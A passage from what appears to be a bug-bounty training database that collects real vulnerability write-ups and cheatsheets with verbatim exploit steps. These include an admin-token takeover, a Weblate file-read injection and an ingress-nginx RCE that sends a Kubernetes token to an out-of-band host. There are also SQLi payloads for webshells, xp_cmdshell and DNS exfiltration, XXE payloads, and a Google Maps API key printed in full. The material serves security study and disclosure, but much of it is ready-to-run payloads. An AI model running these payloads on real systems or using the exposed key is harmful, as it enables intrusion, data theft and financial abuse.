A hardcoded admin API token was embedded in a public minified JS bundle served by a government certificate-verification portal's admin panel. The token alone, exchanged via the vLogin endpoint, yielded a full admin session with no credentials, captcha, or OTP required. Using that session, the researcher modified public-facing UI language strings served live to every visitor; the same JS file also disclosed the AES key used to encrypt all user passwords plus internal server paths and PHP stack traces.

**Cause racine :** A static authentication token shipped in client-side JavaScript was accepted by the backend as sole proof of admin identity, with no session-bound credential or MFA check.

**Preuve technique (verbatim depuis la source) :**

```
Step 1 -- extract the hardcoded token from a public JS bundle:
GET https://verify.[REDACTED].tld/forms/[APP]/admin/assets/index-[hash].js
grep for VLLoginAPI -> VLLoginAPI { token: "[TOKEN_REDACTED]" }

Step 2 -- exchange the public token for a full admin session, zero credentials/captcha/OTP:
curl -sk -X POST "https://verify.[REDACTED].tld/forms/[APP]/admin/api/vLogin/" -H "Content-Type: application/json" -d '{"token":"[TOKEN_REDACTED]"}'
Response: {"session_id":"[REDACTED]","session_token":"[REDACTED]","status":1,"encryption_key":"[REDACTED]","document_key":"[REDACTED]"}

Step 3 -- use the session to overwrite a live public-facing label:
curl -sk -X POST "https://verify.[REDACTED].tld/forms/[APP]/admin/api/LanguageUpdate/" -H "Content-Type: text/plain" -d '{"session_id":"[REDACTED]","session_token":"[REDACTED]","language_id":1,"formData":{"string_id":42,"string_code":"lblHdr1","language_id":"1","string_type":null,"language_string":"BUG_BOUNTY_POC","language_code":"en","source":"web_form"}}'
Response: {"status":1,"msg":"success"}

Step 4 -- confirm it is live to EVERY unauthenticated visitor:
curl -sk -X POST "https://verify.[REDACTED].tld/forms/[APP]/api/getLangMaster/" -H "Content-Type: text/plain" -d '{"language_id": 1}'
-> public API now returns "BUG_BOUNTY_POC" instead of the original text.
Same JS bundle also leaked the AES password-encryption key (AES-CBC + random IV), server file paths, internal hostnames, and PHP stack traces. Note: server strips HTML tags from language strings, which is why this is a content-manipulation/fraud vector rather than stored XSS.
```

**Techniques :** hardcoded-token-extraction, js-bundle-analysis, admin-api-abuse, static-token-auth-bypass

**Correspond aux classes qualifiantes :** auth-bypass, account-takeover, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `https://verify.[REDACTED].tld/forms/[APP]/admin/assets/index-[hash].js`
- `https://verify.[REDACTED].tld/forms/[APP]/admin/api/vLogin/`

**Paramètres impliqués :** `token`, `session_id`, `session_token`, `language_id`, `formData`

---

### Information Disclosure — Unauthenticated API Exposes PII of 500+ Employees and Enterprise Clients

**📄 Cas réel**
sévérité : medium · [source](https://academy.logicalbreach.com/writeups/information-disclosure-unauthenticated-api-exposes-pii-of-500-employees-and-enterprise-clients-852b28b3)

A hardcoded backend URL found in a telecom demo app's frontend JS bundle pointed to an Azure App Service exposing a /dashboard/sessions endpoint requiring no authentication at all. By paginating with offset/limit, the researcher extracted 500+ records with employee names, enterprise client details, session metadata, and internal MongoDB ObjectIDs; the same bundle also leaked an Azure AD Tenant ID.

**Cause racine :** An internal dashboard API was deployed publicly without authentication middleware, and its backend URL was hardcoded into client-side code instead of being proxied through the frontend domain.

**Preuve technique (verbatim depuis la source) :**

```
Step 1 -- extract the hardcoded backend URL from the minified frontend bundle:
curl -s "https://demos.[REDACTED].com/assets/index-[HASH].js" | grep -o "[REDACTED]-backend[^\"]*"
-> https://[REDACTED]-backend-[REDACTED].westeurope-01.azurewebsites.net

Step 2 -- query the endpoint directly, zero auth headers/cookies/API key:
curl -s "https://[REDACTED]-backend-[HASH].westeurope-01.azurewebsites.net/dashboard/sessions"

Step 3 -- paginate to dump everything (no rate limiting observed, <12 calls for 500+ records):
curl -s "https://[BACKEND_URL]/dashboard/sessions?offset=0&limit=50"
curl -s "https://[BACKEND_URL]/dashboard/sessions?offset=50&limit=50"
# repeat with offset += 50

Response shape:
{"sessions":[{"id":"[MONGODB_OBJECTID]","sessionId":"[UUID]","user":"[FULL_NAME]","company":{"name":"[COMPANY_NAME]","website":"https://[REDACTED]/"},"createdAt":"2025-XX-XXTXX:XX:XX.XXXZ","demos":[{"demo":"[DEMO_TYPE]","startedAt":"..."}]}],"pagination":{"total":500,"limit":50,"offset":0,"hasMore":true}}
Same bundle also leaked an Azure AD Tenant ID.
```

**Techniques :** js-bundle-analysis, hardcoded-url-discovery, unauthenticated-api-access, pagination-enumeration

**Correspond aux classes qualifiantes :** auth-bypass

**Signal (endpoints/fonctions observés) :**
- `/assets/index-[hash].js`
- `/dashboard/sessions?offset=0&limit=50`

**Paramètres impliqués :** `offset`, `limit`

---

### Public Exposure of Internal API Models (.smd)

**📄 Cas réel**
CWE-200 · [source](https://academy.logicalbreach.com/writeups/en-public-exposure-of-internal-api-models-smd-10ce697c-0c4e-4077-bf82-165bee277bbe)

A legacy JSON-RPC backend auto-generated .smd (Service Mapping Description) files documenting all backend services for the frontend, left publicly accessible via plain GET requests found through dorking. Downloading these files exposed over 17,000 internal method names, parameters, Java class hierarchies, and HQL query operation types — a complete map for brute-forcing, HQL/SQL injection, and BOLA/IDOR attacks.

**Cause racine :** The server did not restrict access to auto-generated .smd service-descriptor files, relying on security-through-obscurity instead of access control on static documentation endpoints.

**Preuve technique (verbatim depuis la source) :**

```
Discovery: dorking / directory scan for paths like /api/services/ on a legacy JSON-RPC (WaveMaker-style) backend reveals unrestricted .smd (Service Mapping Description) files.
GET /api/services/authService.smd.json?rand=1.111 HTTP/1.1
Host: internal-dashboard.corp.net

Sample of what a single .smd dump exposes (full internal method signatures, param types, ORM query markers):
{
  "methods": [
    {"name": "getClientConsultant", "operationType": "hqlquery", "parameters": [{"name": "tenantId", "type": "java.lang.Integer"}], "returnType": "[com.internalcorp.db.data.output.GetClientConsultantRtnType]"},
    {"name": "getImprovementActionByIdProject", "operationType": "hqlquery", "parameters": [{"name": "idProject", "type": "java.lang.Integer"}, {"name": "idConsultant", "type": "java.lang.Integer"}], "returnType": "[com.internalcorp.db.data.ImprovementAction]"}
  ],
  "serviceType": "JSON-RPC",
  "serviceURL": "databaseDB.json"
}
17,000 internal methods exposed this way in total -- each hqlquery-tagged method is a direct pointer to a likely HQL/SQL injection surface, and parameter names like tenantId/idProject are a ready-made BOLA/IDOR target list.
```

**Techniques :** smd-file-exposure, directory-scanning-dorking, api-surface-mapping, service-descriptor-leak

**Correspond aux classes qualifiantes :** bola, sqli

**Signal (endpoints/fonctions observés) :**
- `/api/services/`
- `/api/services/authService.smd.json?rand=1.111`

**Paramètres impliqués :** `rand`, `tenantId`, `idProject`, `idConsultant`

---

### Sensitive Data Exposure via JSON-RPC (Whistleblowing Channel)

**📄 Cas réel**
sévérité : critical · CWE-200 · [source](https://academy.logicalbreach.com/writeups/en-sensitive-data-exposure-via-json-rpc-whistleblowing-channel-cdcf8659-4341-4694-9084-6fa2f84b8d1a)

A JSON-RPC endpoint of a corporate whistleblowing platform required no session or authorization header, and its getChannelConfigDetails method returned the entire backend 'Channel' database object rather than only UI-needed fields. A single unauthenticated POST leaked private emails of legal/compliance staff, tenant IDs, hidden whistleblower portal URLs with tokens, and could be queried against other organizations sharing the platform to dump their company names and Tax ID numbers.

**Cause racine :** The backend had no access control on the JSON-RPC endpoint and returned the full unfiltered database object instead of enforcing least-privilege field filtering and tenant isolation server-side.

**Preuve technique (verbatim depuis la source) :**

```
Single unauthenticated POST, no session cookie or auth header of any kind:
POST /api/v1/services/CoreConfigService.json HTTP/1.1
Host: dashboard.internal-sec.com
Content-Type: application/json
Content-Length: 125

{"id":0,"method":"getChannelConfigDetails","params":[null,null,null,null,null],"viewJsonProperties":null}

-> 200 OK with a full, unfiltered dump of the backend's internal config object (reverse mass assignment: the server never restricts which fields go out, it just serializes the whole domain object). Leaked in the response: plaintext DPO/admin emails, internal tenantId + raw DB primary-key UUIDs, hidden portal URLs with organization_token query params, and -- because the SAME JSON-RPC method could be queried against sibling organizations sharing the platform -- each org's real registered company name and Tax ID (TIN/NIF) via nothing more than swapping the target subdomain.
```

**Techniques :** unauthenticated-json-rpc, mass-data-exposure, cross-tenant-data-leak, reverse-mass-assignment

**Correspond aux classes qualifiantes :** mass-assignment, bola

**Signal (endpoints/fonctions observés) :**
- `/api/v1/services/CoreConfigService.json`

**Paramètres impliqués :** `id`, `method`, `params`, `viewJsonProperties`, `tenantId`, `organization_token`

---

### Unauthorized usage of External API Key (Usage of Google Maps API Key ==> $$$)

**📄 Cas réel**
[source](https://hackerone.com/reports/881118)

Glassdoor's frontend JS bundle contained a hardcoded Google Maps API key with no restrictions (referrer/API/quota). The key was confirmed reusable against the Google Static Maps API by generating a live map; since Google bills per 1,000 requests, an attacker could script large call volumes to run up significant charges on Glassdoor's account.

**Cause racine :** The Google Maps API key was hardcoded in public client-side JavaScript without API/HTTP-referrer restrictions or usage quotas.

**Preuve technique (verbatim depuis la source) :**

```
Step 1 -- find the key in a public JS bundle:
https://www.glassdoor.com/jobs-ux-app/static/js/dist/jobSearch.bundle.js?v=9e1a1feryy
search cached/proxied traffic for strings starting with "AIz" (Google API key prefix) -> AIzaSyAzyn67z-olqQZ0QBxFkCu71r_dMZ000wo

Step 2 -- confirm which Google API the key is scoped to (keyhacks reference: https://github.com/streaak/keyhacks#Google-Maps-API-key):
https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key=AIzaSyAzyn67z-olqQZ0QBxFkCu71r_dMZ000wo
-> map image renders -> key is live and usable by anyone, unrestricted by referrer/IP.
Cost model cited: ~$2 per 1000 Static Maps requests -> a simple request loop turns this into a direct, unbounded billing attack against the victim's Google Cloud account.
```

**Techniques :** exposed-api-key, js-bundle-analysis, key-abuse-verification, unrestricted-key-financial-abuse

**Signal (endpoints/fonctions observés) :**
- `https://www.glassdoor.com/jobs-ux-app/static/js/dist/jobSearch.bundle.js`
- `https://maps.googleapis.com/maps/api/staticmap?key=...`

**Paramètres impliqués :** `key`, `center`, `zoom`, `size`

---

### CVE-2026-11856: cross-origin Digest auth state leak

**📄 Cas réel**
[source](https://hackerone.com/reports/3793260)

When an application reuses the same libcurl easy handle for sequential requests (a recommended practice), the Digest authentication state captured for the first origin is silently sent to a different subsequent origin, because Curl_pretransfer() clears initial_origin but does not reset data->state.digest between calls to curl_easy_perform(). Even explicitly changing credentials via CURLOPT_USERPWD between calls, the new password hash is sent under the previous server's realm and nonce.

**Cause racine :** Curl_pretransfer() does not reset data->state.digest between two curl_easy_perform() calls on a reused easy handle, leaking Digest authentication state computed for one origin to a different target origin.

**Preuve technique (verbatim depuis la source) :**

```
Two Python HTTP servers (digest_servers.py): a legitimate server on :19001 that issues a real Digest challenge, an attacker server on :19002 that just logs whatever Authorization header it receives.

C client (digest_poc.c), single easy handle reused across 3 phases:
CURL *c = curl_easy_init();
curl_easy_setopt(c, CURLOPT_HTTPAUTH, CURLAUTH_DIGEST);
curl_easy_setopt(c, CURLOPT_USERPWD, "alice:bond");
/* Phase 1: real API call */
curl_easy_setopt(c, CURLOPT_URL, "http://127.0.0.1:19001/api/me"); curl_easy_perform(c);
/* Phase 2: same handle, attacker URL */
curl_easy_setopt(c, CURLOPT_URL, "http://127.0.0.1:19002/hook"); curl_easy_perform(c);
/* Phase 3: even with a DIFFERENT user set, still leaks */
curl_easy_setopt(c, CURLOPT_USERPWD, "bob:secret");
curl_easy_setopt(c, CURLOPT_URL, "http://127.0.0.1:19002/hook"); curl_easy_perform(c);

Observed output -- attacker server receives FULL Digest headers for BOTH alice and bob, computed against the legitimate server's realm/nonce/opaque:
[ATTACKER:19002]   /hook
    auth=Digest username="alice", realm="legit-api@example.com", nonce="LEGIT-NONCE-7c3f0e1d", uri="/hook", nc=00000002, qop=auth, response="9c85cd807d6e52bfdc8f2a2c09420fea", opaque="LEGIT-OPAQUE", algorithm=MD5
[ATTACKER:19002]   /hook
    auth=Digest username="bob", realm="legit-api@example.com", nonce="LEGIT-NONCE-7c3f0e1d", uri="/hook", nc=00000003, qop=auth, response="d6776337f455e7e590120439cc8c74a2", opaque="LEGIT-OPAQUE", algorithm=MD5
-- nc increments GLOBALLY across the origin boundary, proving state isn't reset. Note: the curl CLI tool itself is NOT affected (calls curl_easy_reset() between transfers) -- this is a libcurl-consuming-application bug, e.g. webhook fetchers / link unfurlers that reuse one easy handle.
Attacker primitives from the leaked header: (1) same-URI replay against the real server within the nonce lifetime, (2) offline dictionary attack on the password since HA1=MD5(user:realm:password) is fully crackable from nonce+cnonce+nc+qop+uri+response.
```

**Techniques :** handle-reuse, state-leak, digest-auth-replay, differential-testing

**Correspond aux classes qualifiantes :** auth-bypass

**Signal (endpoints/fonctions observés) :**
- `Curl_pretransfer()`
- `data->state.digest`

**Paramètres impliqués :** `CURLOPT_USERPWD`, `CURLOPT_HTTPAUTH`, `CURLOPT_URL`

---

## Injection (SQLi / XXE / Code / Argument)

*5 cas.*

### Argument Injection in manage/ssh via host parameter leads to sensitive file disclosure on Weblate

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3518571)

The Weblate SSH management page passes the user-supplied host parameter directly into the argument list of an ssh-keyscan subprocess call without sanitization. An admin attacker can prefix the host value with the -f flag to make ssh-keyscan treat it as a file path instead of a hostname, and the resulting stderr/stdout is echoed back via Django's messaging framework, letting the attacker read arbitrary local files (/etc/passwd, Django settings.py's SECRET_KEY, SSH private keys) though not achieve direct RCE.

**Cause racine :** The host parameter is appended unsanitized to the ssh-keyscan command-line argument list before being passed to subprocess.run, allowing attacker-controlled CLI flags (e.g. -f) to be injected and their output leaked through error handling.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable code (weblate/vcs/ssh.py, add_host_key()):
cmdline = ["ssh-keyscan"]
if port:
    cmdline.extend(["-p", str(port)])
cmdline.append(host)   # <-- unsanitized, attacker-controlled
try:
    result = subprocess.run(cmdline, env=get_clean_env(), check=True, text=True, capture_output=True)
    ...
except subprocess.CalledProcessError as exc:
    messages.error(request, gettext("Could not get host key: %s") % exc.stderr or exc.stdout)  # <-- leaks file content back to the UI

Raw exploit request (host value starts with -f to make ssh-keyscan treat it as a file path instead of a hostname):
POST /manage/ssh/ HTTP/1.1
Host: 127.0.0.1

csrfmiddlewaretoken=t4FmhxCwsT1O7EBbd8ecQaadr7uqfs4cU3XN3L5BtPJ61xXGqdDstIovEOVUeA3F&host=-f/etc/passwd&port=12&action=add-host
-> Django messaging framework echoes ssh-keyscan's stderr/stdout back to the page, which now contains the targeted file's content. Also demonstrated against -f/app/data/ssh/id_rsa. No direct RCE (ssh-keyscan has no -exec-style flag), impact capped at arbitrary local file read as the web user. Confirmed on Weblate 5.0.2 and 5.15.2.
```

**Techniques :** argument-injection, cli-flag-injection (-f), subprocess-command-construction, error-message-based file disclosure

**Correspond aux classes qualifiantes :** lfi

**Signal (endpoints/fonctions observés) :**
- `/manage/ssh/`

**Paramètres impliqués :** `host`, `type`, `port`, `action`

---

### Injection in path parameter of Ingress-nginx leads to arbitrary nginx directive injection, file read and code execution

**📄 Cas réel**
[source](https://hackerone.com/reports/2701701)

In a multi-tenant Kubernetes cluster, the permissive 'path' field of an Ingress resource lets a tenant with ingress create/modify rights inject arbitrary nginx config directives into the shared ingress-nginx controller, bypassing an earlier mitigation that only blocked direct by_lua use. The attacker chains two ingresses — one that writes an attacker Lua payload to disk via client_body_in_file_only, and a second that includes and executes it via set_by_lua_block/io.popen — running arbitrary shell commands on the controller and exfiltrating the Kubernetes service account token out-of-band.

**Cause racine :** The Ingress path field is not restricted to a safe subset of nginx location syntax, so attacker-controlled Ingress specs can inject arbitrary directives (including file write and Lua execution primitives) into the shared nginx.conf used by the multi-tenant controller.

**Preuve technique (verbatim depuis la source) :**

```
Stage 1 -- Ingress that turns a POST body into a file write on the controller's filesystem (permissive `path` field lets you inject raw nginx directives):
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations: {kubernetes.io/ingress.class: nginx}
  name: f292392-research
spec:
  rules:
  - host: f292392.com
    http:
      paths:
      - backend: {service: {name: legitimate-service, port: {number: 80}}}
        path: |-
          /f292392body/ {
          limit_except POST              { deny all; }
          client_body_temp_path          /tmp/nginx/f292392;
          client_body_in_file_only       on;
          client_body_buffer_size        128K;
          #
        pathType: Prefix

curl http://f292392.com/f292392body/ --resolve f292392.com:80:4.178.145.81 -k -vv --data-binary '@./exploit.txt'
# exploit.txt (malicious nginx config uploaded as the request body):
set_by_lua_block $my_var {
            local rsfile = io.popen(ngx.req.get_headers()["pathinjection"]);
            local rschar = rsfile:read("*all");ngx.say(rschar);
            return rschar;
}
proxy_set_header X-My-Var $my_var;

Stage 2 -- second Ingress that includes the uploaded file and executes it via a header-controlled shell command:
apiVersion: networking.k8s.io/v1
kind: Ingress
spec:
  rules:
  - host: f292392.com
    http:
      paths:
      - path: |-
          /rcewithhost/ {
          include /tmp/nginx/f292392/*;
          #
        pathType: Prefix

curl http://f292392.com/rcewithhost/ --resolve f292392.com:80:4.178.145.81 -k -H "pathinjection: curl -F 'file=@/var/run/secrets/kubernetes.io/serviceaccount/token' http://hdyy6lwp6kifbu1cv7euclvuyl4cs3gs.oastify.com.oastify.com"
-> attacker's OOB listener receives an HTTP POST carrying the Kubernetes service-account token, confirming full command execution on the shared ingress-nginx controller from a low-privilege tenant.
```

**Techniques :** nginx-directive-injection, two-stage-exploit-chain, lua-code-execution (set_by_lua_block / io.popen), service-account-token exfiltration via OOB HTTP

**Correspond aux classes qualifiantes :** rce, lfi, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `path parameter (Ingress resource)`

**Paramètres impliqués :** `path`, `pathinjection (custom header)`

---

### SQL Injection (SQLi) Cheatsheet

**🧾 Cheatsheet**

Covers SQL injection fundamentals across MySQL, PostgreSQL, MSSQL and Oracle — error-based, blind, union-based and time-based exploitation, DBMS fingerprinting, and schema enumeration. Provides a tiered list of injection vectors and payloads for WAF bypass, no-quotes/no-comma filter evasion, and high-impact outcomes such as file read, webshell writing, full RCE (MSSQL xp_cmdshell / PostgreSQL COPY FROM PROGRAM), and blind OOB DNS exfiltration.

**Preuve technique (verbatim depuis la source) :**

```
Error-based (MySQL): EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))  -> error message leaks 'secret'
Error-based (PostgreSQL): CAST((SELECT password FROM users LIMIT 1) AS int)  -> syntax error echoes the value
Error-based (Oracle): SELECT CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
Time-based (MySQL): IF(CONDITION, SLEEP(10), 'a')
Time-based (PostgreSQL): CASE WHEN (CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END
Time-based (MSSQL): IF (CONDITION) WAITFOR DELAY '0:0:10'
Time-based (Oracle): CASE WHEN (CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END
Enumerate tables: SELECT table_name FROM information_schema.tables  |  Oracle: SELECT table_name FROM all_tables
Enumerate columns: SELECT column_name FROM information_schema.columns WHERE table_name='USERS'
LOAD_FILE (file read): ' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3--
INTO OUTFILE (webshell -> RCE): ' UNION SELECT "<?php system($_GET['<command>']); ?>", 2 INTO OUTFILE '/var/www/html/shell.php'--
User dump: ' UNION SELECT null, concat(user,':',password), null FROM users--
No-quotes bypass (hex): WHERE id=0x61646d696e
Comma bypass: UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
MSSQL RCE: ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--
PostgreSQL RCE: DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;
Blind OOB DNS exfil: (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.yourcollab.com\\a')))
Inverse logic trick: WHERE id = -1 OR 1=1 (forces output on a non-existent ID)
Double URL encoding bypass: %2527 instead of '
```

**Techniques :** error-based SQLi (MySQL/PostgreSQL/Oracle), blind SQLi via logical conditions, time-based SQLi (SLEEP/pg_sleep/WAITFOR DELAY/dbms_pipe), union-based SQLi, DBMS fingerprinting, information_schema enumeration, column-count detection via ORDER BY/GROUP BY, credential tampering via UPDATE/INSERT, HEX()/CHAR() WAF evasion, double URL encoding bypass, LOAD_FILE local file read, INTO OUTFILE webshell write (RCE), MSSQL xp_cmdshell RCE, PostgreSQL COPY FROM PROGRAM RCE, blind OOB DNS exfiltration

**Correspond aux classes qualifiantes :** sqli, rce

---

### XXE (XML External Entity) Cheatsheet

**🧾 Cheatsheet**

A practical reference for XXE recon (content-type sniffing, file upload testing, SOAP/WSDL targeting) and core exploitation for local file disclosure, SSRF against internal/cloud services, and blind/OOB exfiltration. Also covers error-based blind XXE, local DTD hijacking to bypass firewalls, XXE via SVG uploads, Billion Laughs DoS payloads, and XInclude for bypassing WAFs that only filter on DOCTYPE/<!ENTITY>.

**Preuve technique (verbatim depuis la source) :**

```
Recon: send Content-Type: application/xml to an endpoint expecting JSON -- 'Malformed XML' error (not 'Unsupported Media Type') confirms an active XML parser is reachable.
Billion Laughs DoS payload:
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 ]>
<root>&lol2;</root>

XInclude bypass (works even when DOCTYPE is blocked/filtered -- many WAFs only look for <!ENTITY>):
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>

Automation: ruby XXEinjector.rb --host=[IP] --file=req.txt --path=/etc/passwd (OOB exfiltration harness)
```

**Techniques :** Content-Type sniffing recon, malicious .docx/.svg upload recon, SOAP/WSDL targeting, local file read via external entity, SSRF via external entity, OOB blind XXE via Collaborator/VPS, error-based blind XXE, local DTD hijacking, XXE via SVG upload, Billion Laughs DoS, XInclude WAF bypass, XXEinjector automation

**Correspond aux classes qualifiantes :** xxe, ssrf

---

### Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com graphql

**📄 Cas réel**
[source](https://hackerone.com/reports/3694007)

The GraphQL sort_query argument of Query.search on hackerone.com/graphql is passed through unchanged to Elasticsearch's sort parameter, with no schema validation or keyword allowlist, allowing injection of scripted sort clauses (_script) in Painless. Differential testing (syntactically valid vs invalid payloads, constant scripts vs ones reading the internal _seq_no field) proved the Painless script is compiled and executed per-document server-side, before the GraphQL resolver's authorization layer. Testing was deliberately limited to the researcher's own account and the _seq_no metadata field, without reading other tenants' data.

**Cause racine :** The sort_query: String argument is passed raw to the Elasticsearch cluster as a sort parameter with no server-side schema validation or rejection of script (_script) directives, allowing arbitrary Painless script execution per document.

**Preuve technique (verbatim depuis la source) :**

```
Baseline field sort (confirms sort_query is parsed as raw JSON and applied):
curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" --data-raw '{"query":"query{search(index:NotificationsIndex,query_string:\"*\",sort_query:\"[{\\\"id\\\":\\\"asc\\\"}]\",size:5){nodes{... on NotificationDocument{id}}}}"}'

Differential compile-oracle (5 payloads, only script.source changes; 500 vs 200 tracks Painless compile success):
[{"_script":{"type":"number","order":"asc"}}]                                                    -> HTTP 500 (malformed shape)
[{"_script":{"type":"number","script":{"source":"","lang":"painless"},"order":"asc"}}]              -> HTTP 500 (compile failure, empty)
[{"_script":{"type":"number","script":{"source":"\"unterminated","lang":"painless"},"order":"asc"}}]  -> HTTP 500 (compile failure)
[{"_script":{"type":"number","script":{"source":"1","lang":"painless"},"order":"asc"}}]               -> HTTP 200, total_count:716
[{"_script":{"type":"number","script":{"source":"1+1","lang":"painless"},"order":"asc"}}]             -> HTTP 200, total_count:716

Differential per-document execution proof -- Request A (constant script) vs Request B (reads doc["_seq_no"].value per document):
sq_A='[{"_script":{"type":"number","script":{"source":"1","lang":"painless"},"order":"asc"}}]'
sq_B='[{"_script":{"type":"number","script":{"source":"doc[\"_seq_no\"].value","lang":"painless"},"order":"asc"}}]'
query: search(index:NotificationsIndex,query_string:"*",sort_query:$sq,size:5){edges{cursor node{id}}}

Request A first-5 decoded _id: 451190393, 433571802, 444651582, 444773121, 445067118
Request B first-5 decoded _id: 404547633, 408446504, 416737094, 417300042, 417467303 (strictly ascending, matches the known-good sort_query:'[{"id":"asc"}]' baseline exactly)
Zero overlap between A and B in the top 5 -> proves the Painless script actually executed once PER DOCUMENT server-side and its return value drove sort order, before any GraphQL resolver-level authorization filter runs. Testing was deliberately capped to reading only the ES-internal _seq_no metadata field on the researcher's own already-filtered result set -- no other fields, no cross-tenant reads, no sandbox-escape attempts.
```

**Techniques :** differential-testing, script-injection, graphql-abuse, blind-execution-oracle

**Correspond aux classes qualifiantes :** rce, graphql

**Signal (endpoints/fonctions observés) :**
- `https://hackerone.com/graphql`
- `Query.search`
- `Organization.findings_search.sort_query: String`

**Paramètres impliqués :** `sort_query`, `query_string`, `index`, `size`, `script.source`, `script.lang`

---

## Memory Corruption

*1 cas.*

### CVE-2026-8925: SASL double-free

**📄 Cas réel**

Curl_auth_gsasl_is_supported() frees gsasl->ctx on gsasl_client_start() failure but doesn't null the pointer; Curl_auth_gsasl_cleanup(), called unconditionally on connection close, frees the same pointer again, causing a double-free. The trigger is server-controlled: a server merely needs to advertise SCRAM-SHA-256/SHA-1 in its capability response for libcurl to call the vulnerable function, without even completing the handshake. Reproduced under ASan via an LD_PRELOAD shim forcing gsasl_client_start() to fail.

**Cause racine :** gsasl->ctx is freed by gsasl_done() in Curl_auth_gsasl_is_supported() without being reset to NULL after a gsasl_client_start() failure, and Curl_auth_gsasl_cleanup() unconditionally frees it again at connection close.

**Preuve technique (verbatim depuis la source) :**

```
Two-site free-without-null bug (lib/vauth/gsasl.c):
// gsasl.c:47-50, first free (no NULL after):
res = gsasl_client_start(gsasl->ctx, mech, &gsasl->client);
if(res != GSASL_OK) {
  gsasl_done(gsasl->ctx);   /* frees gsasl->ctx ... */
  return FALSE;              /* ... but gsasl->ctx still holds the freed pointer */
}
// gsasl.c:108-115, second free, unconditional, no NULL guard:
void Curl_auth_gsasl_cleanup(struct gsasldata *gsasl) {
  gsasl_finish(gsasl->client); gsasl->client = NULL;
  gsasl_done(gsasl->ctx);   /* second free if the probe above already failed */
  gsasl->ctx = NULL;
}
Trigger is 100% server-controlled: any server merely advertising AUTH SCRAM-SHA-256/SCRAM-SHA-1 in its capability banner causes libcurl to call Curl_auth_gsasl_is_supported() -- no completed handshake needed.

Forced-failure LD_PRELOAD shim (simulates old/stripped libgsasl without needing real OOM/version conditions):
/* gsasl_shim.c */
#include <gsasl.h>
int gsasl_client_start(Gsasl *ctx, const char *mech, Gsasl_session **out) {
    (void)ctx; (void)mech; (void)out;
    return GSASL_UNKNOWN_MECHANISM;
}
gcc -shared -fPIC -o gsasl_shim.so gsasl_shim.c $(pkg-config --cflags gsasl)
LD_PRELOAD=./gsasl_shim.so ASAN_OPTIONS=detect_leaks=0 ./src/curl -v imaps://user:pass@mail.example.com/

ASAN confirms the exact two-site pattern:
==2529510==ERROR: AddressSanitizer: attempting double-free on 0x6f2bd1fe5880 in thread T0:
    #2 ... in Curl_auth_gsasl_cleanup gsasl.c:113    <- second free
    #3 ... in gsasl_conn_dtor vauth.c:207
freed by thread T0 here:
    #2 ... in Curl_auth_gsasl_is_supported gsasl.c:49    <- first free
    #3 ... in sasl_choose_gsasl curl_sasl.c:367

Fix (root cause, 1 line): after gsasl_done(gsasl->ctx); add gsasl->ctx = NULL;
Defense-in-depth fix: wrap both frees in Curl_auth_gsasl_cleanup() with if(gsasl->client)/if(gsasl->ctx) guards, matching the NTLM/Kerberos cleanup pattern. Same anti-pattern class as CVE-2018-16840 and CVE-2023-27537.
```

**Techniques :** double-free, use-after-free-pattern, asan-detection, fault-injection

**Correspond aux classes qualifiantes :** memory-corruption

**Signal (endpoints/fonctions observés) :**
- `lib/vauth/gsasl.c`
- `Curl_auth_gsasl_is_supported()`
- `Curl_auth_gsasl_cleanup()`

**Paramètres impliqués :** `SCRAM-SHA-256`, `SCRAM-SHA-1`

---

## meta

*1 cas.*

### Bug Bounty Cheatsheet — index de ressources et payloads concrets

**📄 Cas réel**
[source](https://academy.logicalbreach.com/cheatsheets/bug-bounty-cheatsheet-ed129872)

Pas un writeup unique mais un index de ressources compilé par un chasseur BB : checklists par catégorie (2FA bypass, 403 bypass, AWS S3, CSV injection, DNS, file upload, GraphQL, JWT, recon, SSRF, SSTI, XSS...), mélangé à des payloads concrets directement exploitables (endpoints Grafana connus vulnérables avec CVE, endpoints WordPress classiques, payloads d'injection de commande basiques, endpoints admin dev/staging courants). Valeur principale : la liste de CVE ciblées + les endpoints/payloads concrets, le reste étant des pointeurs vers des ressources externes (articles Medium, checklists Google Slides) non vérifiables ici.

**Preuve technique (verbatim depuis la source) :**

```
Concrete, directly-usable payloads/endpoints from the index (not just link pointers):
WordPress 403 bypass: GET /wp-admin/setup-config.php?step=1
WordPress XML-RPC abuse: POST /xmlrpc.php
WordPress user enumeration: GET /wp-json/wp/v2/users/
Common dev/staging admin guesses: /dev/register/, /stag/register/, /dev/login/
Grafana CVE-2020-13379 (DoS/SSRF via avatar): GET <GRAFANA_URL>/avatar/%7B%7Bprintf%20%22%25s%22%20%22this.Url%22%7D%7D
Grafana signup-enabled check: GET <GRAFANA_URL>/signup
Grafana default creds: admin:admin
OS command injection blind probes: ping -n 21 127.0.0.1  |  nslookup -q=cname my.burpcollaborator.net
